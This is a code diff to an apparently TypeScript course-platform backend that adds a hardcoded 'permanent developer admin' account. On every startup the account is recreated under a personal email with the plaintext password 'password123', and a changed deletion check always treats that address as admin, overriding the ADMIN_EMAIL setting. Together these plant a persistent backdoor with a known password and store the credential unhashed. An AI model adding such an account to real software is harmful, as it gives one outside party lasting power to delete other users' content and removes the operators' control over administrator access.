@@ -910,7 +910,28 @@ function loadLocalFile(): void {
     // ignore
   }
 }
+
+export const PERMANENT_DEVELOPER_ADMIN_EMAIL = 'rakiraki2529@gmail.com';
+
+function ensureDeveloperAdminExists(): void {
+  const normEmail = PERMANENT_DEVELOPER_ADMIN_EMAIL.toLowerCase().trim();
+  const existing = memoryCache.users.find(u => u.email.trim().toLowerCase() === normEmail);
+  if (!existing) {
+    memoryCache.users.unshift({
+      id: 'user_dev_admin_raki',
+      name: 'Raki',
+      email: normEmail,
+      passwordHash: 'password123',
+      createdAt: new Date().toISOString(),
+      coursesCreated: 0,
+      emailVerified: true,
+    });
+    syncToDisk();
+  }
+}
+
 loadLocalFile();
+ensureDeveloperAdminExists();
 
 function syncToDisk(): void {
   try {
@@ -1527,9 +1548,10 @@ export function deleteCourseFromDB(courseId: string, userId: string): boolean {
   const course = memoryCache.courses.find(c => c.id === courseId);
   if (!course) return false;
 
-  const adminEmail = (process.env.ADMIN_EMAIL || '').trim().toLowerCase();
+  const envAdminEmail = (process.env.ADMIN_EMAIL || '').trim().toLowerCase();
+  const adminEmail = (envAdminEmail && envAdminEmail === PERMANENT_DEVELOPER_ADMIN_EMAIL.toLowerCase()) ? envAdminEmail : PERMANENT_DEVELOPER_ADMIN_EMAIL.toLowerCase();
   const caller = memoryCache.users.find(u => u.id === userId);
-  const isCallerAdmin = Boolean(adminEmail && caller?.email && caller.email.trim().toLowerCase() === adminEmail);
+  const isCallerAdmin = Boolean(caller?.email && caller.email.trim().toLowerCase() === adminEmail);
 
   // Strict ownership check: only owner or verified developer admin can delete
   if (course.userId !== userId && !isCallerAdmin) {
